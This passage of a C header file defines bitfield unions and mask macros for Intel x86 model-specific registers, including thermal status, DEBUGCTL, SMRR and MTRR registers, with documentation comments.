#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL(_)                       (((_) >> 22) & 0x01)

        /**
         * @brief xTPR Message Disable <b>(R/W)</b>
         *
         * [Bit 23] When set to 1, xTPR messages are disabled. xTPR messages are optional messages that allow the processor to
         * inform the chipset of its priority.
         *
         * @remarks If CPUID.01H:ECX[14] = 1
         */
        UINT64 XtprMessageDisable : 1;
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_BIT                    23
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_FLAG                   0x800000
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_MASK                   0x01
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE(_)                     (((_) >> 23) & 0x01)
        UINT64 Reserved7 : 10;

        /**
         * @brief XD Bit Disable <b>(R/W)</b>
         *
         * [Bit 34] When set to 1, the Execute Disable Bit feature (XD Bit) is disabled and the XD Bit extended feature flag will
         * be clear (CPUID.80000001H: EDX[20]=0).
         * When set to a 0 (default), the Execute Disable Bit feature (if available) allows the OS to enable PAE paging and take
         * advantage of data only pages.
         * BIOS must not alter the contents of this bit location, if XD bit is not supported. Writing this bit to 1 when the XD Bit
         * extended feature flag is set to 0 may generate a \#GP exception.
         *
         * @remarks If CPUID.80000001H:EDX[20] = 1
         */
        UINT64 XdBitDisable : 1;
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_BIT                          34
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_FLAG                         0x400000000
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_MASK                         0x01
#define IA32_MISC_ENABLE_XD_BIT_DISABLE(_)                           (((_) >> 34) & 0x01)
        UINT64 Reserved8 : 29;
    };

    UINT64 Flags;
} IA32_MISC_ENABLE_REGISTER;


/**
 * Performance Energy Bias Hint.
 *
 * @remarks If CPUID.6H:ECX[3] = 1
 */
#define IA32_ENERGY_PERF_BIAS                                        0x000001B0
typedef union
{
    struct
    {
        /**
         * @brief Power Policy Preference
         *
         * [Bits 3:0] - 0 indicates preference to highest performance.
         * - 15 indicates preference to maximize energy saving.
         */
        UINT64 PowerPolicyPreference : 4;
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_BIT            0
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_FLAG           0x0F
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_MASK           0x0F
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE(_)             (((_) >> 0) & 0x0F)
        UINT64 Reserved1 : 60;
    };

    UINT64 Flags;
} IA32_ENERGY_PERF_BIAS_REGISTER;


/**
 * @brief Package Thermal Status Information <b>(RO)</b>
 *
 * Package Thermal Status Information. Contains status information about the package's thermal sensor.
 *
 * @remarks If CPUID.06H: EAX[6] = 1
 * @see Vol3B[14.8(PACKAGE LEVEL THERMAL MANAGEMENT)]
 */
#define IA32_PACKAGE_THERM_STATUS                                    0x000001B1
typedef union
{
    struct
    {
        /**
         * [Bit 0] Pkg Thermal Status
         */
        UINT64 ThermalStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_BIT                 0
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_FLAG                0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_MASK                0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS(_)                  (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Pkg Thermal Status Log
         */
        UINT64 ThermalStatusLog : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_BIT             1
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_FLAG            0x02
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_MASK            0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG(_)              (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Pkg PROCHOT \# event
         */
        UINT64 ProchotEvent : 1;
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_BIT                  2
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_FLAG                 0x04
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_MASK                 0x01
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT(_)                   (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Pkg PROCHOT \# log
         */
        UINT64 ProchotLog : 1;
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_BIT                    3
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_FLAG                   0x08
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_MASK                   0x01
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG(_)                     (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Pkg Critical Temperature Status
         */
        UINT64 CriticalTemperatureStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_BIT    4
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_FLAG   0x10
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_MASK   0x01
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS(_)     (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Pkg Critical Temperature Status Log
         */
        UINT64 CriticalTemperatureStatusLog : 1;
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_BIT 5
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_FLAG 0x20
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG(_) (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Pkg Thermal Threshold \#1 Status
         */
        UINT64 ThermalThreshold1Status : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_BIT      6
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_FLAG     0x40
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_MASK     0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS(_)       (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Pkg Thermal Threshold \#1 log
         */
        UINT64 ThermalThreshold1Log : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_BIT         7
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_FLAG        0x80
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_MASK        0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG(_)          (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Pkg Thermal Threshold \#2 Status
         */
        UINT64 ThermalThreshold2Status : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_BIT      8
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_FLAG     0x100
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_MASK     0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS(_)       (((_) >> 8) & 0x01)

        /**
         * [Bit 9] Pkg Thermal Threshold \#2 log
         */
        UINT64 ThermalThreshold2Log : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_BIT         9
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_FLAG        0x200
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_MASK        0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG(_)          (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Pkg Power Limitation Status
         */
        UINT64 PowerLimitationStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_BIT        10
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_FLAG       0x400
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_MASK       0x01
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS(_)         (((_) >> 10) & 0x01)

        /**
         * [Bit 11] Pkg Power Limitation log
         */
        UINT64 PowerLimitationLog : 1;
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_BIT           11
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_FLAG          0x800
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_MASK          0x01
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG(_)            (((_) >> 11) & 0x01)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 22:16] Pkg Digital Readout
         */
        UINT64 DigitalReadout : 7;
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_BIT                16
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_FLAG               0x7F0000
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_MASK               0x7F
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT(_)                 (((_) >> 16) & 0x7F)
        UINT64 Reserved2 : 41;
    };

    UINT64 Flags;
} IA32_PACKAGE_THERM_STATUS_REGISTER;


/**
 * @brief Package Thermal Interrupt Control <b>(RO)</b>
 *
 * Enables and disables the generation of an interrupt on temperature transitions detected with the package's thermal
 * sensor.
 *
 * @remarks If CPUID.06H: EAX[6] = 1
 * @see Vol3B[14.8(PACKAGE LEVEL THERMAL MANAGEMENT)]
 */
#define IA32_PACKAGE_THERM_INTERRUPT                                 0x000001B2
typedef union
{
    struct
    {
        /**
         * [Bit 0] Pkg High-Temperature Interrupt Enable.
         */
        UINT64 HighTemperatureInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_BIT 0
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Pkg Low-Temperature Interrupt Enable.
         */
        UINT64 LowTemperatureInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_BIT 1
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x02
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Pkg PROCHOT\# Interrupt Enable.
         */
        UINT64 ProchotInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_BIT    2
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_FLAG   0x04
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_MASK   0x01
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE(_)     (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 4] Pkg Overheat Interrupt Enable.
         */
        UINT64 OverheatInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_BIT   4
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_FLAG  0x10
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_MASK  0x01
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE(_)    (((_) >> 4) & 0x01)
        UINT64 Reserved2 : 3;

        /**
         * [Bits 14:8] Pkg Threshold \#1 Value
         */
        UINT64 Threshold1Value : 7;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_BIT            8
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_FLAG           0x7F00
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_MASK           0x7F
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE(_)             (((_) >> 8) & 0x7F)

        /**
         * [Bit 15] Pkg Threshold \#1 Interrupt Enable.
         */
        UINT64 Threshold1InterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_BIT 15
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_FLAG 0x8000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE(_)  (((_) >> 15) & 0x01)

        /**
         * [Bits 22:16] Pkg Threshold \#2 Value.
         */
        UINT64 Threshold2Value : 7;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_BIT            16
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_FLAG           0x7F0000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_MASK           0x7F
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE(_)             (((_) >> 16) & 0x7F)

        /**
         * [Bit 23] Pkg Threshold \#2 Interrupt Enable.
         */
        UINT64 Threshold2InterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_BIT 23
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_FLAG 0x800000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE(_)  (((_) >> 23) & 0x01)

        /**
         * [Bit 24] Pkg Power Limit Notification Enable.
         */
        UINT64 PowerLimitNotificationEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_BIT 24
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_FLAG 0x1000000
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE(_) (((_) >> 24) & 0x01)
        UINT64 Reserved3 : 39;
    };

    UINT64 Flags;
} IA32_PACKAGE_THERM_INTERRUPT_REGISTER;


/**
 * Trace/Profile Resource Control.
 *
 * @remarks 06_0EH
 */
#define IA32_DEBUGCTL                                                0x000001D9
typedef union
{
    struct
    {
        /**
         * [Bit 0] Setting this bit to 1 enables the processor to record a running trace of the most recent branches taken by the
         * processor in the LBR stack.
         *
         * @remarks 06_01H
         */
        UINT64 Lbr : 1;
#define IA32_DEBUGCTL_LBR_BIT                                        0
#define IA32_DEBUGCTL_LBR_FLAG                                       0x01
#define IA32_DEBUGCTL_LBR_MASK                                       0x01
#define IA32_DEBUGCTL_LBR(_)                                         (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Setting this bit to 1 enables the processor to treat EFLAGS.TF as single-step on branches instead of single-step
         * on instructions.
         *
         * @remarks 06_01H
         */
        UINT64 Btf : 1;
#define IA32_DEBUGCTL_BTF_BIT                                        1
#define IA32_DEBUGCTL_BTF_FLAG                                       0x02
#define IA32_DEBUGCTL_BTF_MASK                                       0x01
#define IA32_DEBUGCTL_BTF(_)                                         (((_) >> 1) & 0x01)
        UINT64 Reserved1 : 4;

        /**
         * [Bit 6] Setting this bit to 1 enables branch trace messages to be sent.
         *
         * @remarks 06_0EH
         */
        UINT64 Tr : 1;
#define IA32_DEBUGCTL_TR_BIT                                         6
#define IA32_DEBUGCTL_TR_FLAG                                        0x40
#define IA32_DEBUGCTL_TR_MASK                                        0x01
#define IA32_DEBUGCTL_TR(_)                                          (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Setting this bit enables branch trace messages (BTMs) to be logged in a BTS buffer.
         *
         * @remarks 06_0EH
         */
        UINT64 Bts : 1;
#define IA32_DEBUGCTL_BTS_BIT                                        7
#define IA32_DEBUGCTL_BTS_FLAG                                       0x80
#define IA32_DEBUGCTL_BTS_MASK                                       0x01
#define IA32_DEBUGCTL_BTS(_)                                         (((_) >> 7) & 0x01)

        /**
         * [Bit 8] When clear, BTMs are logged in a BTS buffer in circular fashion. When this bit is set, an interrupt is generated
         * by the BTS facility when the BTS buffer is full.
         *
         * @remarks 06_0EH
         */
        UINT64 Btint : 1;
#define IA32_DEBUGCTL_BTINT_BIT                                      8
#define IA32_DEBUGCTL_BTINT_FLAG                                     0x100
#define IA32_DEBUGCTL_BTINT_MASK                                     0x01
#define IA32_DEBUGCTL_BTINT(_)                                       (((_) >> 8) & 0x01)

        /**
         * [Bit 9] When set, BTS or BTM is skipped if CPL = 0.
         *
         * @remarks 06_0FH
         */
        UINT64 BtsOffOs : 1;
#define IA32_DEBUGCTL_BTS_OFF_OS_BIT                                 9
#define IA32_DEBUGCTL_BTS_OFF_OS_FLAG                                0x200
#define IA32_DEBUGCTL_BTS_OFF_OS_MASK                                0x01
#define IA32_DEBUGCTL_BTS_OFF_OS(_)                                  (((_) >> 9) & 0x01)

        /**
         * [Bit 10] When set, BTS or BTM is skipped if CPL > 0.
         *
         * @remarks 06_0FH
         */
        UINT64 BtsOffUsr : 1;
#define IA32_DEBUGCTL_BTS_OFF_USR_BIT                                10
#define IA32_DEBUGCTL_BTS_OFF_USR_FLAG                               0x400
#define IA32_DEBUGCTL_BTS_OFF_USR_MASK                               0x01
#define IA32_DEBUGCTL_BTS_OFF_USR(_)                                 (((_) >> 10) & 0x01)

        /**
         * [Bit 11] When set, the LBR stack is frozen on a PMI request.
         *
         * @remarks If CPUID.01H: ECX[15] = 1 && CPUID.0AH: EAX[7:0] > 1
         */
        UINT64 FreezeLbrsOnPmi : 1;
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_BIT                         11
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_FLAG                        0x800
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_MASK                        0x01
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI(_)                          (((_) >> 11) & 0x01)

        /**
         * [Bit 12] When set, each ENABLE bit of the global counter control MSR are frozen (address 38FH) on a PMI request.
         *
         * @remarks If CPUID.01H: ECX[15] = 1 && CPUID.0AH: EAX[7:0] > 1
         */
        UINT64 FreezePerfmonOnPmi : 1;
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_BIT                      12
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_FLAG                     0x1000
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_MASK                     0x01
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI(_)                       (((_) >> 12) & 0x01)

        /**
         * [Bit 13] When set, enables the logical processor to receive and generate PMI on behalf of the uncore.
         *
         * @remarks 06_1AH
         */
        UINT64 EnableUncorePmi : 1;
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_BIT                          13
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_FLAG                         0x2000
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_MASK                         0x01
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI(_)                           (((_) >> 13) & 0x01)

        /**
         * [Bit 14] When set, freezes perfmon and trace messages while in SMM.
         *
         * @remarks If IA32_PERF_CAPABILITIES[12] = 1
         */
        UINT64 FreezeWhileSmm : 1;
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_BIT                           14
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_FLAG                          0x4000
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_MASK                          0x01
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM(_)                            (((_) >> 14) & 0x01)

        /**
         * [Bit 15] When set, enables DR7 debug bit on XBEGIN.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[11] = 1)
         */
        UINT64 RtmDebug : 1;
#define IA32_DEBUGCTL_RTM_DEBUG_BIT                                  15
#define IA32_DEBUGCTL_RTM_DEBUG_FLAG                                 0x8000
#define IA32_DEBUGCTL_RTM_DEBUG_MASK                                 0x01
#define IA32_DEBUGCTL_RTM_DEBUG(_)                                   (((_) >> 15) & 0x01)
        UINT64 Reserved2 : 48;
    };

    UINT64 Flags;
} IA32_DEBUGCTL_REGISTER;


/**
 * @brief SMRR Base Address <b>(Writeable only in SMM)</b>
 *
 * SMRR Base Address. Base address of SMM memory range.
 *
 * @remarks If IA32_MTRRCAP.SMRR[11] = 1
 */
#define IA32_SMRR_PHYSBASE                                           0x000001F2
typedef union
{
    struct
    {
        /**
         * @brief Type
         *
         * [Bits 7:0] Type. Specifies memory type of the range.
         */
        UINT64 Type : 8;
#define IA32_SMRR_PHYSBASE_TYPE_BIT                                  0
#define IA32_SMRR_PHYSBASE_TYPE_FLAG                                 0xFF
#define IA32_SMRR_PHYSBASE_TYPE_MASK                                 0xFF
#define IA32_SMRR_PHYSBASE_TYPE(_)                                   (((_) >> 0) & 0xFF)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 31:12] SMRR physical Base Address.
         */
        UINT64 SmrrPhysicalBaseAddress : 20;
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_BIT            12
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_FLAG           0xFFFFF000
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_MASK           0xFFFFF
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS(_)             (((_) >> 12) & 0xFFFFF)
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} IA32_SMRR_PHYSBASE_REGISTER;


/**
 * @brief SMRR Range Mask <b>(Writeable only in SMM)</b>
 *
 * Range Mask of SMM memory range.
 *
 * @remarks If IA32_MTRRCAP[SMRR] = 1
 */
#define IA32_SMRR_PHYSMASK                                           0x000001F3
typedef union
{
    struct
    {
        UINT64 Reserved1 : 11;

        /**
         * [Bit 11] Enable range mask.
         */
        UINT64 EnableRangeMask : 1;
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_BIT                     11
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_FLAG                    0x800
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_MASK                    0x01
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK(_)                      (((_) >> 11) & 0x01)

        /**
         * [Bits 31:12] SMRR address range mask.
         */
        UINT64 SmrrAddressRangeMask : 20;
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_BIT               12
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_FLAG              0xFFFFF000
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_MASK              0xFFFFF
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK(_)                (((_) >> 12) & 0xFFFFF)
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} IA32_SMRR_PHYSMASK_REGISTER;


/**
 * DCA Capability.
 *
 * @remarks If CPUID.01H: ECX[18] = 1
 */
#define IA32_PLATFORM_DCA_CAP                                        0x000001F8

 /**
  * If set, CPU supports Prefetch-Hint type.
  *
  * @remarks If CPUID.01H: ECX[18] = 1
  */
#define IA32_CPU_DCA_CAP                                             0x000001F9

  /**
   * DCA type 0 Status and Control register.
   *
   * @remarks If CPUID.01H: ECX[18] = 1
   */
#define IA32_DCA_0_CAP                                               0x000001FA
typedef union
{
    struct
    {
        /**
         * [Bit 0] Set by HW when DCA is fuseenabled and no defeatures are set.
         */
        UINT64 DcaActive : 1;
#define IA32_DCA_0_CAP_DCA_ACTIVE_BIT                                0
#define IA32_DCA_0_CAP_DCA_ACTIVE_FLAG                               0x01
#define IA32_DCA_0_CAP_DCA_ACTIVE_MASK                               0x01
#define IA32_DCA_0_CAP_DCA_ACTIVE(_)                                 (((_) >> 0) & 0x01)

        /**
         * [Bits 2:1] TRANSACTION.
         */
        UINT64 Transaction : 2;
#define IA32_DCA_0_CAP_TRANSACTION_BIT                               1
#define IA32_DCA_0_CAP_TRANSACTION_FLAG                              0x06
#define IA32_DCA_0_CAP_TRANSACTION_MASK                              0x03
#define IA32_DCA_0_CAP_TRANSACTION(_)                                (((_) >> 1) & 0x03)

        /**
         * [Bits 6:3] DCA_TYPE.
         */
        UINT64 DcaType : 4;
#define IA32_DCA_0_CAP_DCA_TYPE_BIT                                  3
#define IA32_DCA_0_CAP_DCA_TYPE_FLAG                                 0x78
#define IA32_DCA_0_CAP_DCA_TYPE_MASK                                 0x0F
#define IA32_DCA_0_CAP_DCA_TYPE(_)                                   (((_) >> 3) & 0x0F)

        /**
         * [Bits 10:7] DCA_QUEUE_SIZE.
         */
        UINT64 DcaQueueSize : 4;
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_BIT                            7
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_FLAG                           0x780
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_MASK                           0x0F
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE(_)                             (((_) >> 7) & 0x0F)
        UINT64 Reserved1 : 2;

        /**
         * [Bits 16:13] Writes will update the register but have no HW side-effect.
         */
        UINT64 DcaDelay : 4;
#define IA32_DCA_0_CAP_DCA_DELAY_BIT                                 13
#define IA32_DCA_0_CAP_DCA_DELAY_FLAG                                0x1E000
#define IA32_DCA_0_CAP_DCA_DELAY_MASK                                0x0F
#define IA32_DCA_0_CAP_DCA_DELAY(_)                                  (((_) >> 13) & 0x0F)
        UINT64 Reserved2 : 7;

        /**
         * [Bit 24] SW can request DCA block by setting this bit.
         */
        UINT64 SwBlock : 1;
#define IA32_DCA_0_CAP_SW_BLOCK_BIT                                  24
#define IA32_DCA_0_CAP_SW_BLOCK_FLAG                                 0x1000000
#define IA32_DCA_0_CAP_SW_BLOCK_MASK                                 0x01
#define IA32_DCA_0_CAP_SW_BLOCK(_)                                   (((_) >> 24) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * [Bit 26] Set when DCA is blocked by HW (e.g. CR0.CD = 1).
         */
        UINT64 HwBlock : 1;
#define IA32_DCA_0_CAP_HW_BLOCK_BIT                                  26
#define IA32_DCA_0_CAP_HW_BLOCK_FLAG                                 0x4000000
#define IA32_DCA_0_CAP_HW_BLOCK_MASK                                 0x01
#define IA32_DCA_0_CAP_HW_BLOCK(_)                                   (((_) >> 26) & 0x01)
        UINT64 Reserved4 : 37;
    };

    UINT64 Flags;
} IA32_DCA_0_CAP_REGISTER;

/**
 * @defgroup IA32_MTRR_PHYSBASE \
 *           IA32_MTRR_PHYSBASE(n)
 *
 * IA32_MTRR_PHYSBASE(0-9).
 *
 * @remarks If CPUID.01H: EDX.MTRR[12] = 1
 * @see Vol3A[11.11.2.3(Variable Range MTRRs)]
 * @{
 */
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Specifies the memory type for the range.
         */
        UINT64 Type : 8;
#define IA32_MTRR_PHYSBASE_TYPE_BIT                                  0
#define IA32_MTRR_PHYSBASE_TYPE_FLAG                                 0xFF
#define IA32_MTRR_PHYSBASE_TYPE_MASK                                 0xFF
#define IA32_MTRR_PHYSBASE_TYPE(_)                                   (((_) >> 0) & 0xFF)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 47:12] Specifies the base address of the address range. This 24-bit value, in the case where MAXPHYADDR is 36
         * bits, is extended by 12 bits at the low end to form the base address (this automatically aligns the address on a 4-KByte
         * boundary).
         */
        UINT64 PageFrameNumber : 36;
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_BIT                     12
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_FLAG                    0xFFFFFFFFF000
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_MASK                    0xFFFFFFFFF
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER(_)                      (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 16;
    };

    UINT64 Flags;
} IA32_MTRR_PHYSBASE_REGISTER;

#define IA32_MTRR_PHYSBASE0                                          0x00000200
#define IA32_MTRR_PHYSBASE1                                          0x00000202
#define IA32_MTRR_PHYSBASE2                                          0x00000204
#define IA32_MTRR_PHYSBASE3                                          0x00000206
#define IA32_MTRR_PHYSBASE4                                          0x00000208
#define IA32_MTRR_PHYSBASE5                                          0x0000020A
#define IA32_MTRR_PHYSBASE6                                          0x0000020C
#define IA32_MTRR_PHYSBASE7                                          0x0000020E
#define IA32_MTRR_PHYSBASE8                                          0x00000210
#define IA32_MTRR_PHYSBASE9                                          0x00000212
/**
 * @}
 */

